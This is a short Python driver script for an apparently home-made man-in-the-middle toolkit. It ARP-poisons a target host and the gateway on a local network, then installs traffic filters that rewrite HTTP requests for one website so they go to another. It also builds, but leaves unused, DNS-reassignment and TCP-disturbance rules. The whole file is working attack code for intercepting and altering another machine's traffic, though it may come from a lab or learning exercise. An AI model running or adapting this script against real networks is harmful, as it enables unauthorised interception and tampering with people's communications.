from mitm_service.tunneler.tunneler import *
from mitm_service.arp_poison.arp_poison import ARPPoisonService
from mitm_service import protocol_filters
from mitm_service.mitm_service import MITMService
from network.network import Network


def main():
    target = '192.168.1.118'
    gateway = '192.168.1.1'

    mitm = MITMService('eno1', target, gateway)

    redirected_domain = 'www.chabad.com'
    new_domain = 'www.miniclip.com'
    new_ip = socket.gethostbyname(new_domain)

    dns_rewrite = protocol_filters.generate_dns_reassign_rule(redirected_domain, new_ip)
    http_rewrite = protocol_filters.generate_http_replace_filter(redirected_domain, new_domain)
    tcp_rewrite = protocol_filters.generate_tcp_disturbance(socket.gethostbyname(redirected_domain), b'hello')

    mitm.add_filter(0, http_rewrite)
    #mitm.add_filter(0, dns_rewrite)

    mitm.start_mitm()

    while True:
        if(input() == 'q'):
            break

    mitm.stop_mitm()

if __name__ == '__main__':
    main()
